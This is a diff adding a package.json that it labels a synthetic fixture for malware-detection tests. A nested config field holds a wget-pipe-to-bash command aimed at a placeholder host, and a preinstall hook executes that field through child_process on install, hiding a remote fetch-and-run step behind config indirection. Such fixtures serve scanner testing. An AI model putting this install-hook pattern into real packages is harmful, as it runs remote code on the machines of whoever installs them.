@@ -1,0 +1,13 @@
+{
+  "name": "fixture-nested-config-command",
+  "version": "1.0.0",
+  "description": "FIXTURE ONLY - synthetic detection test sample, not real malware",
+  "config": {
+    "boot": {
+      "run": "wget -qO- https://collect.example.invalid/a.sh | bash"
+    }
+  },
+  "scripts": {
+    "preinstall": "node -e \"require('child_process').exec(process.env.npm_package_config_boot_run)\""
+  }
+}
